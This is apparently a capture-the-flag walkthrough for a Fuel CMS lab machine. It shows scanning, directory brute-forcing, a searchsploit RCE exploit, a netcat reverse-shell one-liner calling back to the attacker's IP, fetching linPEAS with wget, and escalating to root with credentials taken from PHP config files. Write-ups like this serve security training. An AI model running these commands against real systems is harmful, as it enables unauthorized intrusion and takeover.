We'll start with nmap scan,

```bash
sudo nmap -A -sV <ip> -oN nmap_scan
```

let's visit http://machineIP,

look at this!! This is a page of **fuel cms**. Let's brute force it's directories,

```bash
./dirsearch.py -u http://<machineIP> -e txt,php -i 200,301
``` 

![image](https://user-images.githubusercontent.com/67465230/173224095-a222b8f8-d649-491a-9e58-789abda7215e.png)

we got some directories. After visiting each one of them, /robots.txt stands as one we're looking for,

navigate to **/robots.txt**,

we got /fuel directory, let's visit it,

after visiting **/fuel** path, i got this,

![image](https://user-images.githubusercontent.com/67465230/173224105-d6a3a051-c4fe-4a0d-989d-b49913fc3da1.png)

seems like we have to login into this. Since we don't have any credentials we can't login into this so we need a way around it.

**Note: Later I found out that we are given the default credentials i.e admin: admin but we actually don't need them ;-)**

But let's search for exploit **fuel cms** (known vulnerability) either on searchsploit or google, I prefer **searchsploit**,

```bash
searchsploit fuel cms
```

![image](https://user-images.githubusercontent.com/67465230/173224112-2f386e4b-3622-41ec-adce-314ab2fddff6.png)

we got RCE vulnerability. I download this exploit using this command,

```bash
searchsploit -m linux/webapps/47138.py
``` 

![image](https://user-images.githubusercontent.com/67465230/173224116-e44e1967-7de1-4e19-9b33-d97fcd697485.png)

so we've downloaded exploit on same directory.

the exploit code looks like this,

![image](https://user-images.githubusercontent.com/67465230/173224123-60c01502-7828-4d97-89ae-16c3f6eb8684.png)

to use this exploit, we've to change 2 things, first IP address of remote machine and port to 80 and then remove proxies=proxy because we don't want burp to intercept our process. 

and then we'll run this exploit using python2,

we got unstable web-shell. 

Let's see where we're or in which directory we're in,

![image](https://user-images.githubusercontent.com/67465230/173224133-ad07afce-1990-41bf-83d3-e3e177de165d.png)

seems like we're in /var/www/html.

From here, we will use netcat reverse shell to get a rev connection to get a normal shell,

run this command on web-shell we got and start the netcat listener via `nc -nvlp 4444`, 

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.8.80 4444 >/tmp/f
```

after running this command, we'll instantly get a reverse connection on our netcat,

we got user flag.

**Privilege Escalation:** After enumerating everything, I got nothing specific. So I tried to run linPEAS to automate the enumeration and check if can found anything specific. So i transfer LinPEAS.sh file on remote system by starting python server,

navigate to /tmp folder and then there type `wget http://<tun0IP:8000>/linPEAS` and then make this script executable and run it,

after sometime, I encountered that there are **credentials** for root user in **PHP config files**,

![image](https://user-images.githubusercontent.com/67465230/194687577-64952da2-e033-4aa9-bba5-fd71b3be72cf.png)

so I tried to use them using,

```bash
su root
```

and then I got system access. Now, go hunt for root flag. :)
